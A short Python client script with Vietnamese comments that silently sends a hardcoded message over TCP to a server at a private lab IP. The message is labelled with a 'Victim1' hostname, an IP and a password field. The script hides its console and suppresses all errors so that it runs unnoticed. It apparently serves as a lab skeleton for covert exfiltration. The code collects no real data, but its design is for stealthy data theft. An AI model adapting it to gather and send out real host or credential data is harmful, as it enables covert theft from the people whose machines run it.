"""
client.py  —  Chạy trên Máy 2 (Silent Mode)
Tự động đóng gói thông điệp có sẵn trong code và gửi ngầm sang Máy 1.
Không hiển thị console.
"""

import socket
import datetime

# ── CẤU HÌNH — SỬA IP VÀ PORT CHO PHÙ HỢP ────────────
SERVER_IP   = '192.168.127.138'   # <-- Sửa thành IP của Máy 1
SERVER_PORT = 12345
# ──────────────────────────────────────────────────────

# ── THÔNG ĐIỆP ĐƯỢC NHẬP SẴN TẠI ĐÂY ──────────────────
SENDER_NAME = "May 2"
SUBJECT     = "INFO"
MESSAGE_BODY = """HOSTNAME : Victim1
IP : 192.168.127.139
PASS : 1
...
....
.....
"""
# ──────────────────────────────────────────────────────


def send_file(content: str, filename: str) -> bool:
    """Gửi nội dung file sang server một cách im lặng."""
    data_bytes = content.encode('utf-8')
    sender_name = filename.rsplit('_', 1)[0] 

    # Tạo header theo chuẩn cũ để server Máy 1 vẫn hiểu được
    header = (
        f"filename={filename}\n"
        f"sender={sender_name}\n"
        f"size={len(data_bytes)}\n"
    ).encode('utf-8') + b"\n---END_HEADER---\n"

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect((SERVER_IP, SERVER_PORT))

            # Gửi header + data
            s.sendall(header + data_bytes)

            # Chờ ACK từ server
            ack = s.recv(64)
            if ack != b"ACK":
                return False

            # Chờ xác nhận nhận xong từ server
            result = s.recv(64)
            if result == b"OK":
                return True
            else:
                return False

    except Exception:
        # Bỏ qua mọi lỗi (timeout, refuse, v.v.) để đảm bảo chạy ngầm 100%
        return False


def main():
    # Đóng gói nội dung thông điệp
    timestamp_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    content = (
        f"======================================\n"
        f"  THONG TIN DUOC GUI TU MAY 2\n"
        f"======================================\n"
        f"Nguoi gui  : {SENDER_NAME}\n"
        f"Chu de     : {SUBJECT}\n"
        f"Thoi gian  : {timestamp_str}\n"
        f"======================================\n\n"
        f"{MESSAGE_BODY}\n"
    )

    # Đặt tên file tự động dựa trên tiêu đề
    safe_subject = "".join(c if c.isalnum() or c in (' ', '_') else '_' for c in SUBJECT)
    safe_subject = safe_subject.strip().replace(' ', '_')[:30]
    filename = f"{safe_subject}_{datetime.datetime.now().strftime('%H%M%S')}.txt"

    # Gọi hàm gửi (không in kết quả)
    send_file(content, filename)


if __name__ == "__main__":
    main()
